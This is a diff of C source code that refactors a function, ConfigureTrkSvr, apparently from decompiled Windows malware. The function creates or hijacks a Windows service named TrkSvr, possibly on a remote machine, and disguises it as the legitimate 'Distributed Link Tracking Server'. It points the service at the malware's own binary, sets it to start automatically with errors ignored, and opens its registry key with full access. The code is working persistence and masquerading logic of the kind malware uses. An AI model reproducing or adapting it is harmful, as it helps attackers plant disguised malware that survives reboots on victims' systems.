@@ -215,40 +215,43 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 		if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
 		{
 			svc_trksrv = CreateServiceW(hSCManager, L"TrkSvr", L"Distributed Link Tracking Server", 0xF01FF, 0x10, 2, 0, svc_path, 0, 0, L"RpcSs", 0, 0);
-			if(svc_trksrv)
-			{
-				goto changeDescription;
-			}
-		}
-		
-		CloseServiceHandle(hSCManager);
-		return 0;
-	}
+			if( !svc_trksrv )
+				return false;
 
-	pcbBytesNeeded = 0;
-	if(!QueryServiceConfigW(svc_trksrv, NULL, NULL, &pcbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
-		lpServiceConfig = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);
-	
-	if(!QueryServiceConfigW(svc_trksrv, lpServiceConfig, pcbBytesNeeded, &pcbBytesNeeded))
-		goto noConfig;
-	
-	/** ----->> Compare the last 3 characters of the dependencies with "vcs" (???) <<----- **/
-	//v5 = (WCHAR *)&byte_416552[strlenW(L"C:\\Windows\\system32\\svchost.exe -k netsvcs")]; // Strange
-	if(!strcmpW(&lpServiceConfig->lpBinaryPathName[strlenW(lpServiceConfig->lpBinaryPathName) - 3], L"vcs")) // L"vcs" = v5
-	{
-		CloseServiceHandle(svc_trksrv);
-		CloseServiceHandle(hSCManager);
-		return 0;
+			// Change the service description
+			ChangeServiceConfig2W(svc_trksrv, SERVICE_CONFIG_DESCRIPTION, &service_info);
+		}
+		else
+		{
+			CloseServiceHandle(hSCManager);
+			return false;
+		}
 	}
-	
-	/** ----->> Change service config, register it as startup service <<----- **/
-	ChangeServiceConfigW(svc_trksrv, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, svc_path, NULL, 0, L"RpcSs", NULL, NULL, NULL);
-	
-changeDescription:
-	/** ----->> Change the service description <<----- **/
-	ChangeServiceConfig2W(svc_trksrv, SERVICE_CONFIG_DESCRIPTION, &service_info);
-	
-noConfig:
+	else
+	{
+		pcbBytesNeeded = 0;
+		if(!QueryServiceConfigW(svc_trksrv, NULL, NULL, &pcbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
+			lpServiceConfig = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);
+		
+		if(QueryServiceConfigW(svc_trksrv, lpServiceConfig, pcbBytesNeeded, &pcbBytesNeeded))
+		{
+			
+			/** ----->> Compare the last 3 characters of the dependencies with "vcs" (???) <<----- **/
+			//v5 = (WCHAR *)&byte_416552[strlenW(L"C:\\Windows\\system32\\svchost.exe -k netsvcs")]; // Strange
+			if(!strcmpW(&lpServiceConfig->lpBinaryPathName[strlenW(lpServiceConfig->lpBinaryPathName) - 3], L"vcs")) // L"vcs" = v5
+			{
+				CloseServiceHandle(svc_trksrv);
+				CloseServiceHandle(hSCManager);
+				return false;
+			}
+			
+			/** ----->> Change service config, register it as startup service <<----- **/
+			ChangeServiceConfigW(svc_trksrv, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, svc_path, NULL, 0, L"RpcSs", NULL, NULL, NULL);
+		}
+	}
+	// Fuck gotos in the ass
+// changeDescription:
+// noConfig:
 	HKEY reg_key;
 	if(!lpMachineName && !RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\TrkSvr", 0, KEY_ALL_ACCESS, &reg_key))
 	{
